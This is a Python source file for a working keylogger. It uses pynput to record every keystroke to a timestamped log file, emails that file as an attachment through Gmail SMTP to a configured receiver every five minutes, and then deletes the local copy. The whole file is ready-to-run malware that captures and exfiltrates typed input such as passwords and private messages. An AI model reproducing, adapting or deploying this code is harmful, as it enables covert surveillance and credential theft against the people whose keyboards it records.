import smtplib
import schedule
import time
import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from pynput import keyboard
from dotenv import load_dotenv
import os

# Load environment variables from .env file
load_dotenv()

# ---------------- CONFIGURATION -----------------
SENDER_EMAIL = os.getenv("SENDER_EMAIL")
SENDER_PASSWORD = os.getenv("SENDER_PASSWORD")
RECEIVER_EMAIL = os.getenv("RECEIVER_EMAIL")
EMAIL_INTERVAL = 5  # Minutes (how often to send logs)
DELETE_LOG_AFTER_EMAIL = True  # Set to False to keep logs
# -----------------------------------------------

log_file = f"keylog_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

# Function to log keystrokes
def on_press(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            with open(log_file, "a") as file:
                file.write(key.char)
        elif key == keyboard.Key.enter:
            with open(log_file, "a") as file:
                file.write("\n")
    except AttributeError:
        with open(log_file, "a") as file:
            file.write(f" [{key}] ")

# Function to stop keylogger when ESC is pressed
def on_release(key):
    if key == keyboard.Key.esc:
        print(f"Log file saved as {log_file}")
        return False

# Function to send log file via email
def send_email():
    try:
        msg = MIMEMultipart()
        msg['From'] = SENDER_EMAIL
        msg['To'] = RECEIVER_EMAIL
        msg['Subject'] = "Keylogger Log File"

        attachment = open(log_file, "rb")
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename={log_file}')
        msg.attach(part)

        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(SENDER_EMAIL, SENDER_PASSWORD)
        server.sendmail(SENDER_EMAIL, RECEIVER_EMAIL, msg.as_string())
        server.quit()
        
        print("✅ Log file sent successfully!")

        # Delete log file after sending
        if DELETE_LOG_AFTER_EMAIL:
            os.remove(log_file)
            print(f"🗑 Log file {log_file} deleted.")
    except Exception as e:
        print(f"❌ Error sending email: {e}")

# Schedule email sending every X minutes
schedule.every(EMAIL_INTERVAL).minutes.do(send_email)

# Start keylogger
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    while True:
        schedule.run_pending()  # Check if it's time to send an email
        time.sleep(1)
        if not listener.running:
            break
